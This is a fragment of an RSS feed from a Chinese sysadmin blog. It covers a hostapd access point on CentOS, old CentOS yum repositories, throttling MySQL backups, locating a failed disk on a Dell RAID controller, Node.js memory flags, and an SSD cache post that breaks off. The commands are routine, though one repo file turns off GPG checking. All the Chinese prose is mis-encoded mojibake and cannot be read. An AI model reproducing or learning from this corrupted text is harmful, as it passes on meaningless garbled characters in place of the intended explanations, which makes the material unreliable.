      <description>&lt;p&gt;è‡ªå·±çš„ç¬”è®°æœ¬æ˜¯è£…äº†ä¸ªCentOSçš„ç³»ç»Ÿï¼Œç„¶åä¸Šé¢è·‘äº†ä¸ªVmwareï¼Œåˆè£…äº†Win10ï¼Œç„¶åæ¥ä¸¤ä¸ªå±å¹•ï¼Œå°çš„æ˜¯linuxè·‘gnomeï¼Œå¤§çš„æ˜¯Win10å±å¹•ï¼Œè¿™æ ·å¹²æ´»çš„ã€‚&lt;/p&gt;
&lt;p&gt;è·¯ç”±æ›´æ˜¯æ··ä¹±æ— æ¯”ï¼Œç½‘å¡æœ‰tun0 / wlan0 / eth0 ï¼Œæ²¡æœ‰å¼„br0ï¼Œè¿™æ˜¯å¤§å‰æã€‚å¦‚æœå¼„br0çš„è¯ï¼Œå¾—æ”¹ä¸€å †ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·çš„è¯wlan0æ— çº¿ç½‘å¡ä¸è”ç½‘å°±ç©ºé—²äº†ï¼Œäºæ˜¯æƒ³æŠŠæ— çº¿ç½‘å¡åšAPå…±äº«å‡ºæ¥ï¼Œç»™æ‰‹æœºç”¨ï¼Œåšæ³•çœŸæ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå¼„äº†2å¤©æ‰å¼„å¥½ï¼Œç½‘ä¸Šçš„æ•™ç¨‹éƒ½æ˜¯è«åå•Šï¼Œä¸å¤ªé€‚åˆCentOSã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®å°±æ˜¯å®‰è£…&lt;code&gt;hostpapd&lt;/code&gt;ï¼ŒæŠŠåšæ³•è®°å½•ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä¸æƒ³æ”¹åŠ¨å·²æœ‰çš„ç½‘ç»œï¼Œé‚£ä¹ˆæ¡¥æ¥è¿™æ¡è·¯å°±å½»åº•æ–­äº†ï¼Œåªèƒ½åœ¨æ— çº¿ç½‘å¡ä¸ŠåšDHCP+NATä¸€æ¡è·¯äº†ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ£€æŸ¥ç½‘ç»œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lspci -k &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -A &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -i &lt;span class=&#34;s2&#34;&gt;&amp;#34;network&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rev 01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Subsystem: Lite-On Communications Inc Device &lt;span class=&#34;m&#34;&gt;0662&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Kernel driver in use: ath9k
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Kernel modules: ath9k
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹åˆ°è‡ªå·±çš„ç½‘å¡é©±åŠ¨æ˜¯ath9kï¼Œå†çœ‹çœ‹æ¨¡å—&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;modinfo ath9k &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;depend&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;depends:        mac80211,ath9k_hw,ath9k_common,cfg80211,ath  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;mac80211, cfg80211çœ‹åˆ°è¿™ä¸ªå°±æ”¾å¿ƒäº†ï¼Œdriverå°±æ˜¯nl80211&lt;/p&gt;
&lt;p&gt;å†ç¡®è®¤ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰* AP å­—æ ·è¿™æ ·å°±æ²¡é—®é¢˜äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iw list&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -A8 &lt;span class=&#34;s2&#34;&gt;&amp;#34;Supported interface modes:&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Supported interface modes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * IBSS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * managed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * AP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * AP/VLAN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * WDS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * monitor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * P2P-client
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         * P2P-GO
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é¦–å…ˆçœ‹çœ‹è‡ªå·±çš„æ— çº¿ç½‘å¡ç‰©ç†åœ°å€ï¼Œ30:10:B3:6A:22:AAè®°ä¸‹æ¥&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç»™è€æ—§çš„CentOSç³»ç»Ÿè®¾ç½®yumæº</title>
      <link>https://rendoumi.com/posts/20240123-centos_yum_old/</link>
      <pubDate>Tue, 23 Jan 2024 15:18:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-centos_yum_old/</guid>
      <description>&lt;p&gt;å‰åŒäº‹Nå¹´å‰ä¹°äº†ä¸ªlinodeçš„ä¸»æœºï¼Œä¸€ç›´ç”¨ï¼Œç³»ç»Ÿæ˜¯CentOS 5.6 x86_64çš„ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æƒ³åœ¨ä¸Šé¢è£…ä¸ªè½¯ä»¶ï¼Œç»“æœyumå¤±æ•ˆäº†ï¼Œé‡è£…ç³»ç»Ÿä¸å¯èƒ½ï¼Œåªèƒ½æ‰¾ä¸ªæ—§çš„yumæºè®¾ç½®ä¸€ä¸‹äº†ã€‚&lt;/p&gt;
&lt;p&gt;æºï¼š &lt;a href=&#34;http://vault.centos.org/&#34;&gt;http://vault.centos.org&lt;/a&gt; ï¼Œæ‰¾åˆ°å­ç›®å½•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/yum.repos.d/base.repo  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;base&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;base  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;baseurl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://vault.centos.org/5.6/os/x86_64/  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;gpgcheck&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæ¸…æ‰ä¸€ä¸‹ç¼“å­˜å°±å¯ä»¥äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum clean all  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>MySQLçš„å¤‡ä»½ç½‘ç»œä¼˜åŒ–</title>
      <link>https://rendoumi.com/posts/20240123-mysql_backup_optimize/</link>
      <pubDate>Tue, 23 Jan 2024 15:17:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-mysql_backup_optimize/</guid>
      <description>&lt;p&gt;å…¬å¸çš„MySQLæœåŠ¡å™¨å®šæ—¶åœ¨å‡Œæ™¨4:00å‡†æ—¶å¼€å§‹å¤‡ä»½ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æœæ˜¯ä¼šè§¦å‘æŠ¥è­¦ï¼Œnetæµé‡å¢é«˜ï¼Œcpuå¢é«˜ï¼Œç£ç›˜ioå¢é«˜ï¼Œè¿™ä¸ªæ˜¯å±äºæ­£å¸¸çš„ï¼Œå¦‚ä½•é¿å…è§¦å‘è­¦æŠ¥å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æœ‰4ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€ä¼˜åŒ–ioå’Œcpuè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥å¹³ç¨³çš„å†™å…¥&#34;&gt;ä¸€ã€ä¼˜åŒ–ioå’Œcpuï¼Œè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥ï¼Œå¹³ç¨³çš„å†™å…¥&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nice -n &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; ionice -c2 -n &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --triggers -R --hex-blob --log-error&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt;.log --databases &lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt; &amp;gt; &lt;span class=&#34;nv&#34;&gt;$basedir&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$backdir&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt;.sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒåŠ å¿«å¤‡ä»½é€Ÿåº¦å¤šçº¿ç¨‹è®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½&#34;&gt;äºŒã€åŠ å¿«å¤‡ä»½é€Ÿåº¦ï¼Œå¤šçº¿ç¨‹ï¼Œè®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;COMMIT_COUNT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;COMMIT_LIMIT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DB in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat ListOfDatabases.txt&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    mysqldump -h... -u... -p... --hex-blob --routines --triggers &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DB&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gzip &amp;gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DB&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;.sql.gz &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt; COMMIT_COUNT++ &lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;COMMIT_COUNT&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; -eq &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;COMMIT_LIMIT&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;COMMIT_COUNT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;wait&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;COMMIT_COUNT&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; -gt &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;wait&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸‰ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ&#34;&gt;ä¸‰ã€ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ&lt;/h4&gt;
&lt;p&gt;-t = throughput in bytes/sec
1000000æ˜¯ä¸€å…†ï¼Œæ¯ç§’åªå…è®¸å†™ä¸€å…†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqldump --single-transaction --quick -u &amp;lt;USER&amp;gt; -p&amp;lt;PASS&amp;gt; &amp;lt;Database&amp;gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cstream -t &lt;span class=&#34;m&#34;&gt;1000000&lt;/span&gt; &amp;gt; backup.sql  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å››ç”¨pvæ¥æ§åˆ¶æµé€Ÿ&#34;&gt;å››ã€ç”¨pvæ¥æ§åˆ¶æµé€Ÿ&lt;/h4&gt;
&lt;p&gt;&amp;ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second.
å•ä½å¯ä»¥æ˜¯ï¼š1k 1m 1g 1t&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dell R730XDæœåŠ¡å™¨å¦‚ä½•ç¡®å®šæ˜¯å“ªå—ç¡¬ç›˜åäº†</title>
      <link>https://rendoumi.com/posts/20240123-dell_disk/</link>
      <pubDate>Tue, 23 Jan 2024 14:16:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-dell_disk/</guid>
      <description>&lt;p&gt;å…¬å¸çš„Dell R720XDæœåŠ¡å™¨æ˜¯ç”¨æ¥åšHadoopå¤§æ•°æ®çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœ‰ä¸¤å—300Gçš„ç¡¬ç›˜åšRaid1ï¼Œä½œä¸ºç³»ç»Ÿç›˜ã€‚&lt;/p&gt;
&lt;p&gt;å‰©ä¸‹3å—ç¡¬ç›˜æ˜¯4TBï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰åšä»»ä½•Raidï¼Œå•ç‹¬åšæ•°æ®ç›˜ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œè¿™ä¸‰å—ç¡¬ç›˜éƒ½è¢« Dell H330 çš„Raidæ§åˆ¶å™¨æ§åˆ¶ï¼Œäºæ˜¯3å—ç¡¬ç›˜å‘¢ï¼Œå…¶å®æ¯ä¸ªéƒ½æ˜¯ä¸ªå•ç‹¬çš„ &lt;code&gt;Raid0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å»æœºæˆ¿å·¡æ£€çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¸€ä¸ªç¡¬ç›˜äº®é»„ç¯ã€‚&lt;/p&gt;
&lt;p&gt;ä»idracå£å¯ä»¥çœ‹åˆ°åäº†ä¸ªç¡¬ç›˜&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240123142237915&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240123-dell_disk/image-20240123142237915.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é—®é¢˜æ¥äº†ï¼Œä¸‰å—å•Šï¼Œåˆ°åº•æ˜¯å“ªå—åäº†å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä¸Šå›¾ï¼Œä¿®è®¢æ˜¯ï¼šGS0Fï¼Œåºåˆ—å·æ˜¯ï¼šZ1Z83DXH&lt;/p&gt;
&lt;p&gt;æˆ‘äº†ä¸ªæ“¦ï¼Œæ‰€æœ‰ç¡¬ç›˜éƒ½è¢«h330æ¥ç®¡ï¼Œæ‰€ä»¥lspciä»€ä¹ˆä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œåªèƒ½çœ‹å‡ºæ˜¯ä¸ªlsiçš„MegaRAIDï¼ï¼ï¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lspci&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep Mega  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 &lt;span class=&#34;m&#34;&gt;3008&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Fury&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rev 02&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ²¡åŠæ³•ï¼Œå…ˆå»ä¸‹ä¸ªMegaCLIå§: &lt;a href=&#34;MegaCli.tgz&#34;&gt;MegaCli.tgz&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt/MegaRAID
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf MegaCli.tgz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†ä¸‹ä¸ªpython, &lt;a href=&#34;mega-status.py&#34;&gt;mega-status.py&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; mega-status.py  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./mega-status.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„è¿™ä¸ªè„šæœ¬æ˜¯å¼•ç”¨äº†64ä½çš„megacli&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;def_megaclipath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/opt/MegaRAID/MegaCli/MegaCli64&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹è¿è¡Œç»“æœå•Š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240123142400354&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240123-dell_disk/image-20240123142400354.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡ŒæŠŠä¿®è®¢å’Œåºåˆ—å·è¿åœ¨ä¸€èµ·äº†ï¼š GS0FZ1Z83DXH å¯¹åº”c0u2p0ï¼Œå¯¹åº”ä¸Šé¢çš„c0u2ï¼Œå¯¹åº”å³è¾¹çš„/dev/sdc&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ˜¯/dev/sdcåæ‰äº†ã€‚&lt;/p&gt;
&lt;p&gt;æå®šã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å¯ä»¥å…ˆå¸è½½/dev/sdcï¼Œç„¶åæ¢ç›˜äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>å°å¾®vpsä¸‹è¿è¡Œnodejséœ€è¦æ³¨æ„çš„gc</title>
      <link>https://rendoumi.com/posts/20240123-nodejs_gc/</link>
      <pubDate>Tue, 23 Jan 2024 10:16:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-nodejs_gc/</guid>
      <description>&lt;p&gt;&lt;code&gt;NodeJS&lt;/code&gt;é»˜è®¤64ä½æœºå™¨GCæ˜¯æœ‰1.4Gå†…å­˜ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ˜¯512æˆ–è€…128å…†å†…å­˜çš„å°vpsï¼Œç«‹æ—¶å°±ä¸çµäº†ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦åŠ å‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--max_old_space_size&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;128&lt;/span&gt; --optimize_for_size
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸€å¥è¯æå®šã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>åœ¨linuxä¸‹ç”¨SSDç›˜æ¥åŠ é€ŸHDDç¡¬ç›˜</title>
      <link>https://rendoumi.com/posts/20240123-ssd_cache/</link>
      <pubDate>Tue, 23 Jan 2024 10:15:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-ssd_cache/</guid>
      <description>&lt;p&gt;&lt;img alt=&#34;image-20240123113743682&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240123-ssd_cache/image-20240123113743682.png&#34;&gt;&lt;/p&gt;
